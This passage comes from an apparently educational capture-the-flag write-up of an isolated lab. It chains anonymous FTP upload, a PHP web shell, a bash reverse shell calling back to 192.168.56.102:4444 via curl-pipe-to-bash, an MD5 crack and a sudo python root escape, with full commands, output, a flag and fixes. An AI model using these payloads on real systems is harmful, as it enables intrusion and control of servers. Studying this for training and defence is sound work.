- **Why this always works:** any rule that lets an unprivileged user run a general-purpose **interpreter, editor, pager, or "shell-out"-capable tool** as root is equivalent to giving them a root shell. This is catalogued at **GTFOBins** (`gtfobins.github.io`) — Python's entry is literally `sudo python -c 'import os; os.system("/bin/sh")'`. The same applies to `vim`, `less`, `awk`, `find -exec`, `perl`, `nmap --interactive`, etc.

**D. Output.** `root@ubuntu:~#`. `id` → `uid=0(root) gid=0(root) groups=0(root)`. `cat /root/root.txt` → `Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky`. Side effect: full control of the machine (read/write any file, add users, install persistence, read `/etc/shadow`, etc.).

---

## 7. Code Comments — annotated payloads

### 7.1 The PHP web shell

**Concept.** A web shell is the smallest possible bridge from "write a file into the web root" to "run commands as the web server." It works only because (a) the file is reachable over HTTP and (b) the server executes `.php` in that directory.

```php
<?php
    // $_GET["cmd"]  — the value of the ?cmd=... parameter in the request URL.
    //                 Entirely attacker-controlled; no validation is performed.
    // system(...)   — PHP builtin. Runs its argument through /bin/sh -c "...",
    //                 streams the command's STDOUT straight into the HTTP response body,
    //                 and returns the last line. Shell metacharacters (| ; && $() ) are honoured
    //                 because it goes through a shell.
    // Net effect:  GET /files/shell.php?cmd=<anything>  ==  run <anything> as user www-data.
    system($_GET["cmd"]);
?>
```

**INPUT → PROCESSING → OUTPUT.**
```
INPUT:   HTTP GET /files/shell.php?cmd=id
PROCESS: Apache maps .php → mod_php → executes system("id") → /bin/sh -c "id" as uid 33
OUTPUT:  HTTP 200, body = "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

### 7.2 The bash reverse shell

**Concept.** Bind stdin, stdout, and stderr of an interactive bash to a single outbound TCP socket, so a plain `nc` listener on the attacker side becomes a remote terminal. "Reverse" because the target dials out (firewall/NAT-friendly).

```bash
bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
# bash -i                        start an INTERACTIVE shell (prompt, job control, reads stdin)
# /dev/tcp/192.168.56.102/4444   bash-only pseudo-path: opening it makes bash connect() a TCP
#                                socket to 192.168.56.102 port 4444 (the attacker's listener)
# >&  <target>                   send BOTH stdout (fd1) and stderr (fd2) into <target> (the socket)
# 0>&1                           send stdin (fd0) to wherever fd1 now points (the socket)
# ==> fds 0,1,2 of an interactive bash are all the one TCP connection back to the attacker
```

**INPUT → PROCESSING → OUTPUT.**
```
INPUT:   web shell runs:  curl http://192.168.56.102:8080/rev.sh | bash
PROCESS: new bash executes the one-liner → connects out to 192.168.56.102:4444 → rebinds fds 0/1/2
OUTPUT:  attacker's `nc -lvnp 4444` shows:  "connect to ... from 192.168.56.101"  + a www-data prompt
```

### 7.3 The sudo → root one-liner

**Concept.** `sudo` grants root to a *program*; if that program can run other programs, root escapes to a shell. A NOPASSWD interpreter rule is a root shell in disguise.

```bash
sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
# sudo /usr/bin/python3.5   sudoers rule: (root) NOPASSWD: /usr/bin/python3.5
#                           → sudo sets uid=0, gid=0 and execs python3.5, no password prompt
# -c 'import os; os.system("/bin/bash")'
#                           python (running as root) shells out to /bin/bash;
#                           the child bash inherits uid 0  → interactive ROOT shell
```

**INPUT → PROCESSING → OUTPUT.**
```
INPUT:   shrek@ubuntu:~$ sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
PROCESS: sudo(→uid0) → python3.5(uid0) → os.system → /bin/sh -c /bin/bash (uid0)
OUTPUT:  root@ubuntu:~#   ;   id → uid=0(root)   ;   cat /root/root.txt → the flag
```

---

## 8. INPUT → PROCESSING → OUTPUT (per phase)

```
PHASE 1  RECON
  INPUT:   192.168.56.0/24 CIDR
  PROCESS: nmap -sn (ARP sweep) → nmap -sV -sC -p- (SYN scan + version probes + default NSE)
  OUTPUT:  target = 192.168.56.101 ; open: 21 ProFTPD (anon!), 22 OpenSSH 7.2p2, 80 Apache 2.4.18

PHASE 2  ENUMERATION
  INPUT:   the three open services
  PROCESS: anonymous FTP login + ls ; gobuster dir against port 80
  OUTPUT:  FTP write works ; /files/ on the webserver == the FTP root (directory overlap)

PHASE 3  EXPLOITATION (RCE)
  INPUT:   ability to write into a web-served directory
  PROCESS: FTP put shell.php ; GET /files/shell.php?cmd=id
  OUTPUT:  command output in the HTTP body → RCE as www-data (uid 33)

PHASE 3b  INTERACTIVE FOOTHOLD
  INPUT:   one-shot RCE + attacker listener on :4444 + payload host on :8080
  PROCESS: web shell fetches rev.sh and pipes to bash → bash connects back via /dev/tcp
  OUTPUT:  interactive www-data shell on the attacker's nc

PHASE 4  POST-EXPLOITATION (cred discovery)
  INPUT:   www-data shell
  PROCESS: read /home/important.txt (hint) → read world-readable /.runme.sh
  OUTPUT:  shrek : 061fe5e7b95d5f98208d7bc89ed2d569  (MD5)

PHASE 4b  OFFLINE CRACK
  INPUT:   the MD5 digest
  PROCESS: CrackStation lookup (or john --format=raw-md5 -w rockyou.txt)
  OUTPUT:  plaintext "youaresmart"   (no traffic to the target)

PHASE 5  PRIVILEGE ESCALATION
  INPUT:   shrek : youaresmart
  PROCESS: ssh shrek@target ; sudo -l → (root) NOPASSWD: /usr/bin/python3.5
           sudo python3.5 -c 'import os; os.system("/bin/bash")'
  OUTPUT:  root@ubuntu:~#  ;  cat /root/root.txt → 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

**One concrete example, end to end:** a single HTTP request
`GET /files/shell.php?cmd=curl%20http://192.168.56.102:8080/rev.sh|bash`
→ Apache/mod_php runs `curl … | bash` as `www-data`
→ a fresh bash executes `bash -i >& /dev/tcp/192.168.56.102/4444 0>&1`
→ the target `connect()`s outbound to the attacker
→ the attacker's `nc -lvnp 4444` prints a `www-data@ubuntu:/var/www/html/files$` prompt.
From that prompt, three commands (`cat /.runme.sh`, `ssh`/`sudo -l`, `sudo python3.5 -c …`) reach root.

---

## 9. Important Concepts

**TERM: Privilege escalation (vertical vs horizontal)**
- *Definition.* Obtaining rights beyond those initially granted. **Vertical** = low-privilege → higher-privilege (`www-data` → `root`). **Horizontal** = moving between accounts at the same level (user A → user B).
- *Why it exists as a concept.* Attackers rarely land as root; the interesting work is the climb. Defenders classify findings by how much of the climb a single bug enables.
- *How it works here.* Vertical, in two hops: `www-data` → `shrek` (horizontal-ish pivot via a leaked credential) → `root` (via `sudo` misconfig).
- *Without the escalation steps.* You'd be stuck as `www-data` — able to read web files but not `/etc/shadow`, `/root`, or other users' data.
- *Where.* README §2.1; walkthrough steps 6–10.

**TERM: Anonymous FTP**
- *Definition.* An FTP server configuration that accepts the username `anonymous`/`ftp` with any (or empty) password, mapping the session to a restricted local account and directory.
- *Why it exists.* Legitimate public file distribution (mirrors, driver downloads) before HTTP dominated.
- *How it works.* ProFTPD's `<Anonymous>` block sets `User ftp`, `Group nogroup`, a chroot, and `<Limit>` rules per command. If `STOR`/`MKD`/`DELE` aren't denied, anonymous users can **write**.
- *Why it matters here.* Anonymous **write** into a web-served directory = attacker-controlled files in the web root.
- *Without it (fixed).* `<Limit WRITE> DenyAll </Limit>` → no upload → no web shell → chain broken at step 3.
- *Where.* Vuln 1; walkthrough step 3.

**TERM: Web shell**
- *Definition.* A script placed on a web server that executes attacker-supplied OS commands via HTTP.
- *Why it exists (for attackers).* It's the canonical way to turn a file-upload / file-write primitive into RCE.
- *How it works.* `<?php system($_GET['cmd']); ?>` — the server executes it; the `cmd` parameter is passed to a shell; output is returned in the response.
- *Why here.* The FTP↔web overlap lets it be uploaded; `mod_php` executes it.
- *Without PHP execution in `/files/` (fixed).* `php_flag engine off` + `AddType text/plain .php` → the file is served as text, not run → no RCE.
- *Where.* Vuln 3; walkthrough steps 4–5; §6.5.

**TERM: Remote Code Execution (RCE)**
- *Definition.* An attacker runs arbitrary code/commands on a remote system.
- *Severity.* Almost always Critical — it's the difference between "reads a page" and "controls the server."
- *How it works here.* `GET /files/shell.php?cmd=<x>` → `<x>` runs as `www-data`.
- *Where.* Confirmed by `?cmd=id` → `uid=33(www-data)`.

**TERM: Reverse shell & `/dev/tcp`**
- *Definition.* A shell where the **victim connects out** to the attacker's listener (vs a *bind* shell where the victim listens).
- *Why "reverse".* Outbound connections are usually permitted; inbound to a random port is usually blocked by firewall/NAT.
- *How it works.* `bash -i >& /dev/tcp/HOST/PORT 0>&1`: bash's built-in `/dev/tcp/HOST/PORT` pseudo-device opens a TCP socket; `>&` and `0>&1` bind stdout/stderr/stdin to it.
- *Without it.* You'd have to run every command as a separate stateless HTTP request — no `cd`, no interactive `sudo`, no `ssh` prompt handling.
- *Where.* `rev.sh`; walkthrough step 5; §6.6.

**TERM: TCP / ports / sockets / listener**
- *Definition.* **TCP** = reliable, ordered, connection-oriented transport. A **port** = a 16-bit number identifying an endpoint on a host. A **socket** = the (protocol, local IP:port, remote IP:port) tuple. A **listener** = a socket in `LISTEN` state waiting for inbound `connect()`.
- *How it works here.* `nc -lvnp 4444` creates a listener; the target's `bash`/`/dev/tcp` does a `connect()` to it → a full-duplex byte pipe.
- *Where.* Every network step; explicitly the `nc` listener + reverse shell.

**TERM: HTTP / query string / URL-encoding**
- *Definition.* **HTTP** = the request/response protocol of the web. A **query string** (`?a=1&b=2`) carries parameters. **URL-encoding** (`%20` for space, `%2F` for `/`) lets arbitrary bytes travel in a URL.
- *Why here.* The web shell reads `$_GET['cmd']`; `curl -G --data-urlencode "cmd=…"` encodes a whole command (with spaces and `|`) so it survives transport.
- *Where.* Walkthrough step 5.

**TERM: DNS / MAC address / OUI (target identification)**
- *Definition.* A **MAC address** is the 48-bit L2 hardware address; its first 24 bits are the **OUI** identifying the vendor. VirtualBox NICs use `08:00:27` (and the host-only gateway `0A:00:27`).
- *Why here.* On the host-only net there's no DNS; the target is identified by OUI (`08:00:27` = a VBox guest) **and** by being the only host with FTP+HTTP+SSH.
- *Where.* README §1 "How to Identify the Target IP".

**TERM: `/etc/passwd`, `/etc/shadow`, PAM (Linux auth)**
- *Definition.* `/etc/passwd` (world-readable) lists accounts (name, UID, GID, home, shell). `/etc/shadow` (root-only) holds the password hashes. **PAM** (Pluggable Authentication Modules) is the framework SSH/`sudo`/`login` call to verify credentials.
- *Why here.* SSH-as-`shrek` succeeds because PAM validates `youaresmart` against `shrek`'s `/etc/shadow` entry. As root you can finally read `/etc/shadow` itself.
- *Where.* Walkthrough steps 7–9.

**TERM: Password hashing, MD5, salt, rainbow tables**
- *Definition.* A password **hash** stores `H(password)` instead of the password. **MD5** produces a 128-bit digest; it's cryptographically broken for collisions and, more importantly here, **far too fast** for password storage. A **salt** is a per-password random value mixed in so identical passwords hash differently and precomputed tables don't work. A **rainbow table / lookup table** is a precomputed `hash → plaintext` database.
- *Why MD5 fails for passwords.* Fast + (here) no visible salt ⇒ a service like CrackStation just looks the digest up. Modern choices — **bcrypt**, **argon2**, **scrypt**, **sha512crypt** — are deliberately slow and always salted.
- *How it works here.* `061fe5e7b95d5f98208d7bc89ed2d569` (32 hex = 16 bytes = MD5) → CrackStation → `youaresmart`.
- *Without MD5 (fixed).* An argon2/bcrypt hash of the same password would not be in any lookup table and would cost far too much to brute force.
- *Where.* Vuln 5 (weak hash) + Vuln 4 (secret in a script); walkthrough step 7; §6.8.

**TERM: `sudo` and `/etc/sudoers`**
- *Definition.* `sudo` runs a command as another user (default root) subject to rules in `/etc/sudoers`. A rule is `user host=(runas) [NOPASSWD:] command`. `NOPASSWD` skips the password prompt for that command.
- *Why it exists.* Delegated administration without sharing the root password; least-privilege ("this user may restart nginx and nothing else").
- *The misconfiguration.* `shrek ALL=(root) NOPASSWD: /usr/bin/python3.5` — grants a **whole interpreter** as root. Any interpreter/editor/pager can spawn a shell ⇒ this is a full root grant.
- *How to enumerate.* `sudo -l`.
- *Without it (fixed).* Delete the line, or scope it to a specific non-interpreter binary with locked-down arguments.
- *Where.* Vuln 6 (sudo); walkthrough steps 9–10; §6.10.

**TERM: GTFOBins**
- *Definition.* A curated list (`gtfobins.github.io`) of Unix binaries that can be abused to break out of restricted contexts — read/write files, or spawn a shell — when they're SUID, or runnable via `sudo`, or capabilities-endowed.
- *Why it matters.* It turns "which sudo grants are dangerous?" from tribal knowledge into a lookup. Python, Perl, Ruby, `vim`, `nano` (via `less`), `less`, `more`, `awk`, `find`, `tar`, `nmap`, `env`, `bash`, `man`, `git`, … all have shell-spawn techniques.
- *How it's used here.* Python's `sudo` entry is exactly `python -c 'import os; os.system("/bin/sh")'`.
- *Where.* Implicit in walkthrough step 10.

**TERM: Rabbit hole / decoy**
- *Definition.* Content placed by the challenge author to look promising but lead nowhere (here `life.c`, `template.html`).
- *Why it exists.* To teach discipline — test hypotheses cheaply, don't over-invest in the first shiny thing.
- *Where.* Walkthrough step 3.

**TERM: Isolated lab / host-only networking / snapshots**
- *Definition.* A virtual network with no route to the real LAN or internet (VirtualBox host-only `vboxnet0`), plus VM snapshots to reset to a known state.
- *Why it exists.* You're deliberately attacking a machine; the isolation boundary is what keeps a training exercise from becoming an incident. Snapshots make the work repeatable.
- *Where.* README §1 and §7.

**TERM: Authorization / scope / rules of engagement / responsible disclosure**
- *Definition.* Written permission from someone with legal authority over the target, defining which systems/IPs are in scope, the timeframe, allowed test types (no DoS), and what to do on impact. **Responsible disclosure** = report privately, allow a fix window (~90 days), publish only after.
- *Why it exists.* Unauthorized testing is a crime (CFAA in the US; Morocco Law 07-03 on cybercrime; data protection under Law 09-08 / GDPR) regardless of intent or damage.
- *Where.* README §7; the vulnerability-report email is the disclosure artifact.

---

## 10. Libraries and Dependencies — the attacker toolchain

There is no application dependency manifest. The "dependencies" are the tools the operator runs on Kali. **None of their internals are in this repo**; the descriptions below are of their externally-observable behavior and role.

| Tool | What it is | Why used here | Which features are used | Why not DIY |
|---|---|---|---|---|
| **`nmap`** | Network mapper / port scanner / NSE script engine | Host discovery + service/version fingerprinting + `ftp-anon` detection | `-sn`, `-sV`, `-sC`, `-p-` | Re-implementing reliable SYN scanning, a fingerprint DB, and vetted scripts is a huge project |
| **`gobuster`** (dir mode) | Concurrent HTTP path brute-forcer in Go | Find `/files/` (the FTP↔web overlap) | `dir -u -w` with a wordlist | A shell `for`-loop of `curl` works but is slow and lacks status-code classification |
| **`ftp`** (BSD/netkit client) | Interactive FTP client | Anonymous login + `put shell.php` | `open`, `USER anonymous`, `put` | Raw FTP over `nc` means hand-driving `PASV`/`STOR` and a second data socket |
| **`curl`** | HTTP(S) client | Trigger the web shell; fetch the payload on the target | `-G`, `--data-urlencode`, plain `GET` | `wget`/`python` also work; `curl` is ubiquitous and handles encoding |
| **`nc` (netcat)** | Arbitrary TCP/UDP read/write | The reverse-shell listener | `-l -v -n -p` | You could write a 10-line Python socket server; `nc` is instant |
| **`python3 -m http.server`** | Stdlib one-line static file server | Serve `rev.sh` to the target without FTP | default (port arg `8080`) | Any static server; this needs zero setup |
| **`ssh`** (OpenSSH client) | Encrypted remote login | Stable session as `shrek` | password auth | The protocol is not something you hand-roll |
| **CrackStation** (web) / **John the Ripper** | Hash-lookup service / offline password cracker | Reverse the MD5 to `youaresmart` | paste-and-lookup / `--format=raw-md5 --wordlist=` | Building a 15-billion-entry rainbow table yourself is the point of the service |
| **`bash`** (on the target) | The shell | `/dev/tcp` reverse connection; `os.system` target | `-i`, `/dev/tcp/HOST/PORT`, fd redirection | It's already there and uniquely provides `/dev/tcp` |

**PROJECT ARTIFACTS vs EXTERNAL TOOLS.** The only things *authored* for this engagement are the three one-liners (`shell.php`, `rev.sh`, the sudo escape) and the `readme.MD`. Everything else is off-the-shelf tooling whose internals are out of scope for this document.

---

## 11. Operating System / Network / Database Concepts

### 11.1 The FTP upload, layer by layer

```
attacker `ftp` client
   │  USER anonymous / PASS / TYPE I / PASV / STOR shell.php   (control conn, TCP 21)
   ▼
ProFTPD (target)
   │  matches <Anonymous> block → chroot to the anon dir → <Limit WRITE> not denied → accept STOR
   ▼
target kernel VFS → ext4 → write bytes to  /var/www/html/files/shell.php   (== the anon FTP root)
```
Key point: **one directory, two doors.** The FTP daemon and Apache both have this path in their served tree.

### 11.2 The web-shell request, layer by layer

```
attacker `curl`  ── GET /files/shell.php?cmd=id ──►  Apache 2.4.18 (TCP 80)
   Apache: match <Directory /var/www/html/files> → .php handler → hand off to mod_php
   mod_php: compile+run the script → system("id") → glibc → fork()+execve("/bin/sh","-c","id")
   /bin/sh: runs `id` as the Apache worker's uid (www-data, 33)
   stdout of `id` ──► PHP output buffer ──► HTTP 200 body ──► back to curl
```

### 11.3 The reverse shell, layer by layer

```
target bash (spawned by the web shell)
   open("/dev/tcp/192.168.56.102/4444")   → bash internally: socket(AF_INET,SOCK_STREAM) + connect()
   dup2(sockfd, 1); dup2(sockfd, 2); dup2(1, 0)     ← the >& and 0>&1 redirections
   ▼   TCP SYN → 192.168.56.102:4444
attacker `nc -lvnp 4444`  (LISTEN → SYN/ACK → ESTABLISHED)
   now: attacker keystrokes → socket → target bash stdin
        target bash stdout/stderr → socket → attacker terminal
```
- **TCP three-way handshake:** SYN → SYN/ACK → ACK establishes the connection before any shell bytes flow.
- **Why outbound succeeds where inbound wouldn't:** stateful firewalls generally allow established outbound flows and their return traffic; they block unsolicited inbound.

### 11.4 Authentication & authorization, layer by layer

```
ssh shrek@target  ──►  sshd  ──►  PAM (pam_unix)  ──►  read /etc/shadow  ──►  crypt(youaresmart, salt) == stored?  ──► session as uid(shrek)
shrek$ sudo python3.5 …  ──►  sudo  ──►  parse /etc/sudoers  ──►  rule match + NOPASSWD  ──►  setresuid(0,0,0)  ──►  execve(/usr/bin/python3.5)
python (uid 0)  ──►  os.system("/bin/bash")  ──►  /bin/sh -c /bin/bash  ──►  bash inherits uid 0  ──►  root shell
```
- **UID 0 is root.** Once any process in the chain runs as UID 0 and can spawn a child, the child is root too — there is no further check.
- **`/etc/shadow` hash format** on this era of Ubuntu is `$id$salt$hash` where `id` picks the algorithm (`1`=MD5, `5`=sha256crypt, `6`=sha512crypt, `2y`=bcrypt). The leaked `/.runme.sh` hash is a *bare* 32-hex MD5 (no `$1$…` wrapper, no visible salt) — the weakest form.

### 11.5 No database

There is no database in this exercise. The nearest "data store" concepts that appear: the filesystem (`/var/www/html/files`, `/.runme.sh`, `/root/root.txt`), `/etc/passwd` + `/etc/shadow` (the account store), and `/etc/sudoers` (the authorization store).

---

## 12. Error Handling

A pentest write-up doesn't "handle errors" like a program; it records **what can go wrong at each step, why, how you'd notice, and the fallback**:

| Step | What can fail | Why | How you notice | Fallback / recovery |
|---|---|---|---|---|
| Host discovery | Target not found | wrong subnet, host down, ARP filtered | `nmap -sn` lists no `.101` | Try `nmap -Pn` (skip discovery), widen range, check VBox network mode |
| Service scan | `ftp-anon` not shown | anon disabled, or `-sC` skipped | no "Anonymous FTP login allowed" line | Manual `nc target 21` then `USER anonymous`/`PASS x`; look at other services |
| FTP upload | `550 Permission denied` on `STOR` | `<Limit WRITE> DenyAll` | server rejects `put` | Chain is broken here — look for another write primitive (HTTP upload form, SSH weak creds, known CVE) |
| Web-shell exec | `shell.php` served as text / `403` | PHP engine off in `/files/`, or wrong path | response body is the PHP source, not `id` output | Try `.phtml`/`.php5`/`.pht`; check if uploads land elsewhere; look for LFI/other RCE |
| RCE test | empty output | `system()` disabled via `disable_functions`, or WAF | `?cmd=id` returns nothing | Try `passthru`, `shell_exec`, `exec`, `` `backticks` ``, `proc_open` |
| Reverse shell | no callback on `nc` | egress firewall blocks outbound to 4444; bash lacks `/dev/tcp` | listener stays silent | Try common allowed ports (443, 80, 53); use `mkfifo`+`nc`, `python -c` pty, `socat` |
| Payload host | target `curl` fails to fetch `rev.sh` | no `curl`/`wget` on target; egress to :8080 blocked | web shell returns a curl error | Use `wget`, `/dev/tcp` to pull the file, or base64 the payload inline in `cmd=` |
| Cred discovery | nothing readable | `/.runme.sh` perms tightened; no breadcrumb | enumeration yields nothing | Run LinPEAS/linenum; check cron, SUID, `~/.bash_history`, config files, `/var/backups` |
| Hash crack | not in any table | strong/long/random password, or not MD5 | CrackStation returns "not found" | Identify hash type (`hashid`/`hash-identifier`); `john`/`hashcat` with `rockyou` + rules; may be infeasible |
| SSH login | `Permission denied` | password reuse assumption wrong; account has no shell | ssh rejects | Re-check username/hash pairing; try `su shrek` from the www-data shell |
| `sudo -l` | prompts for a password / "may not run sudo" | no NOPASSWD grant | sudo asks for `shrek`'s password (which you have) or refuses | If you have the password, enter it; otherwise hunt SUID binaries, kernel exploits, cron, capabilities |
| `sudo python …` | binary path mismatch | rule is `/usr/bin/python3.5` exactly; you ran `python3` | `sudo: python3: command not found` or "not allowed" | Call the *exact* path from the rule; check `which -a` |

The write-up's own "error handling" is the **rabbit-hole discipline** in step 3 (identify `life.c`/`template.html` as decoys and move on) and the report's insistence on documenting every action with timestamps (README §7.4).

---

## 13. Security Analysis

Six vulnerabilities, chained. Removing **any single one** in the initial-access group (1–3) stops remote foothold; removing #6-sudo stops root.

### V1 — Anonymous FTP with write access  *(Critical)*
- **Why the operation exists.** ProFTPD ships an `<Anonymous>` example; someone enabled it for "easy file sharing" and never restricted `STOR`.
- **What can go wrong.** Anyone on the network uploads arbitrary files into the anonymous root.
- **Protection in place.** None. **Fix:** `<Limit WRITE> DenyAll </Limit>` inside `<Anonymous>` (README §5-V1), or disable the `<Anonymous>` block entirely.
- **Trust boundary crossed.** Unauthenticated network user → write to the server's filesystem.

### V2 — FTP directory shared with the web server document root  *(Critical)*
- **Why it exists.** Convenience: "upload here, download via the website."
- **What can go wrong.** Anything written by FTP becomes fetchable — and potentially *executable* — over HTTP.
- **Protection.** None. **Fix:** never point the webroot (or an alias like `/files/`) at the FTP anonymous directory; use separate paths, separate filesystem permissions, separate users.

### V3 — PHP execution enabled in the upload directory  *(Critical)*
- **Why it exists.** `mod_php` executes `.php` everywhere under the docroot by default.
- **What can go wrong.** An uploaded `.php` runs as `www-data` on every request → RCE.
- **Protection.** None. **Fix:** in the upload dir, `php_admin_flag engine off` and `AddType text/plain .php .phtml .php5 .pht` so those extensions are served as text, plus `Options -ExecCGI` and an upload allow-list of extensions.

> V1 ∧ V2 ∧ V3 together = unauthenticated RCE. This is the crux; it's why the report rates the initial-access composite Critical.

### V4 — Secret stored in a world-readable script (`/.runme.sh`)  *(High)*
- **Why it exists.** Someone hard-coded a credential into a helper script and left it `644` (or looser) at `/`.
- **What can go wrong.** Any local account (including the RCE'd `www-data`) reads it.
- **Protection.** None. **Fix:** don't store credentials in scripts at all; use a secrets manager / environment injection / restricted-permission config (`600`, owned by the consuming service account); remove the breadcrumb `/home/important.txt`.

### V5 — Weak password hash (MD5, apparently unsalted)  *(High)*
- **Why it exists.** Legacy habit; MD5 is "good enough looking" (32 hex chars).
- **What can go wrong.** Fast to brute force; unsalted ⇒ instant rainbow-table / online-lookup crack. `061fe5…d569` → `youaresmart` in seconds.
- **Protection.** None. **Fix:** `bcrypt` / `argon2id` / `scrypt` / `sha512crypt` with per-password salts and a high work factor; enforce password length/complexity so even a slow hash isn't dictionary-crackable.

### V6a — Password reuse / predictable credential  *(supporting)*
- The `shrek` SSH password equals the cracked hash's plaintext. Real systems: the leaked hash *is* the account's password. **Fix:** unique credentials per service; MFA on SSH; disable password auth in favor of keys.

### V6b — `sudo NOPASSWD` on a full interpreter (`/usr/bin/python3.5`)  *(Critical)*
- **Why it exists.** Someone needed `shrek` to run "a Python script" as root and granted the interpreter instead of a locked-down wrapper.
- **What can go wrong.** `python -c 'import os; os.system("/bin/bash")'` → instant root shell (GTFOBins). `NOPASSWD` means not even the account password is a speed bump.
- **Protection.** None. **Fix:** delete the rule (README §5-V6). If a script genuinely must run as root, grant `sudo` on *that script's absolute path only*, make the script root-owned and non-writable by `shrek`, avoid passing user-controlled arguments, and drop `NOPASSWD` unless justified. Audit `sudoers` regularly; alert on interpreter invocations via `sudo`.

### Cross-cutting security notes
- **Attack surface pre-foothold:** exactly three TCP ports (21/22/80). The FTP service is the whole story.
- **Privilege requirements:** the attacker needs **no** privilege to start; gains `www-data` (UID 33), then `shrek` (a normal user), then `root` (UID 0).
- **Detection opportunities** (README §7.5): FTP logs showing anonymous `STOR`; a new `.php` file appearing in a web dir; IDS signatures for `$_GET["cmd"]` / web-shell patterns; unusual **outbound** connections (the reverse shell); `sudo` invocations of scripting languages in `auth.log`.
- **What the attacker deliberately did *not* do** (ethics, README §7): no DoS, no touching out-of-scope hosts, no exfiltration of real user data, and the hash crack was done **offline** so the target saw no crack traffic.
- **No invented vulnerabilities:** every item above is directly evidenced by a command and its output in the walkthrough.

---

## 14. Data Flow

### 14.1 The web shell path (upload → RCE)

```
/tmp/shell.php on Kali  ──ftp put──►  /var/www/html/files/shell.php on target   (bytes unchanged)
                                          │  (this dir is BOTH the FTP anon root AND webroot /files/)
GET /files/shell.php?cmd=id  ──►  Apache  ──►  mod_php parses <?php system($_GET['cmd']) ?>
     $_GET['cmd'] = "id"  ──►  system("id")  ──►  /bin/sh -c "id"  (uid 33)
     stdout "uid=33(www-data)…"  ──►  PHP output buffer  ──►  HTTP 200 body  ──►  Kali curl prints it
```
Data transformations: local file → remote file (identical bytes) → a URL parameter string → a shell command string → process stdout bytes → HTTP response body → text on the attacker's terminal.

### 14.2 The credential path (leak → root)

```
/.runme.sh on target  ── cat (as www-data) ──►  "shrek:061fe5e7b95d5f98208d7bc89ed2d569"
   split on ':'  ──►  user="shrek"  ,  hash="061fe5e7b95d5f98208d7bc89ed2d569"
hash  ── paste into CrackStation (on Kali, offline) ──►  plaintext="youaresmart"
(user,plaintext)  ── ssh shrek@192.168.56.101 ──►  PAM validates vs /etc/shadow  ──►  shrek session
shrek session  ── sudo -l ──►  "(root) NOPASSWD: /usr/bin/python3.5"
   ── sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")' ──►  sudo setresuid(0) → python(uid0) → bash(uid0)
root shell  ── cat /root/root.txt ──►  "Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky"
```
Data transformations: a file line → `(user, hash)` tuple → `(user, plaintext)` tuple → an authenticated OS session → a sudo-rule string → a UID-0 process → the flag string.

### 14.3 The single-request end-to-end (most compressed view)

```
one HTTP request
   GET /files/shell.php?cmd=curl%20http://192.168.56.102:8080/rev.sh|bash
        │
        ▼   Apache/mod_php runs:  curl http://192.168.56.102:8080/rev.sh | bash   (as www-data)
   fetch rev.sh  ──►  "bash -i >& /dev/tcp/192.168.56.102/4444 0>&1"
        │
        ▼   new bash executes it → TCP connect() out to 192.168.56.102:4444
   attacker's  nc -lvnp 4444  ──►  interactive www-data shell
```

---

## 15. Real Execution Example

```
$ sudo nmap -sn 192.168.56.0/24
Nmap scan report for 192.168.56.1     (host)
Nmap scan report for 192.168.56.100   (VBox DHCP)
Nmap scan report for 192.168.56.101   MAC: 08:00:27:xx:xx:xx (Oracle VirtualBox)   ← target
Nmap scan report for 192.168.56.102   (self)

$ sudo nmap -sV -sC -p- 192.168.56.101
21/tcp open  ftp     ProFTPD
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.x
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

$ ftp 192.168.56.101
Name: anonymous
Password:                       # <Enter>
230 Anonymous access granted
ftp> ls
life.c
template.html                   # decoys
ftp> put /tmp/shell.php shell.php
226 Transfer complete
ftp> bye

$ gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
/files/               (Status: 301)   # browsing it shows shell.php, life.c, template.html

$ echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php   # (was uploaded above)
$ curl "http://192.168.56.101/files/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)      # RCE confirmed

# --- reverse shell ---
# Terminal 1
$ nc -lvnp 4444
listening on [any] 4444 ...
# Terminal 2
$ echo 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1' > /tmp/rev.sh
$ cd /tmp && python3 -m http.server 8080
# Terminal 3
$ curl -G "http://192.168.56.101/files/shell.php" \
       --data-urlencode "cmd=curl http://192.168.56.102:8080/rev.sh|bash"
# Terminal 1 now:
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 4xxxx
www-data@ubuntu:/var/www/html/files$ cat /home/important.txt
Hint: run /.runme.sh
www-data@ubuntu:/var/www/html/files$ cat /.runme.sh
shrek:061fe5e7b95d5f98208d7bc89ed2d569

# --- offline crack (browser on Kali) ---
CrackStation: 061fe5e7b95d5f98208d7bc89ed2d569  →  youaresmart

$ ssh shrek@192.168.56.101
shrek@192.168.56.101's password: youaresmart
shrek@ubuntu:~$ sudo -l
User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
shrek@ubuntu:~$ sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cat /root/root.txt
Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

Internally at each important step: nmap's SYN scan classifies ports by RST/SYN-ACK; `ftp-anon` NSE actually logs in; ProFTPD accepts `STOR` because no `<Limit WRITE> DenyAll` exists; Apache routes `.php` to `mod_php`; `system()` forks `/bin/sh`; bash's `/dev/tcp` opens a socket and the fd redirections rewire the shell's I/O; CrackStation does a hash-table lookup (no target traffic); PAM validates the SSH password against `/etc/shadow`; `sudo` consults `/etc/sudoers`, sees `NOPASSWD`, `setresuid(0,0,0)`, `execve`s python; python's `os.system` spawns a root bash.

---

## 16. Why This Design?

This is a *training* artifact, so "design" = why the challenge is built this way and why the write-up is structured this way.

- **Why a chain instead of one bug?** Real compromises are chains. Teaching one CVE teaches a trick; teaching recon → foothold → enumeration → pivot → escalation teaches a *methodology* that transfers.
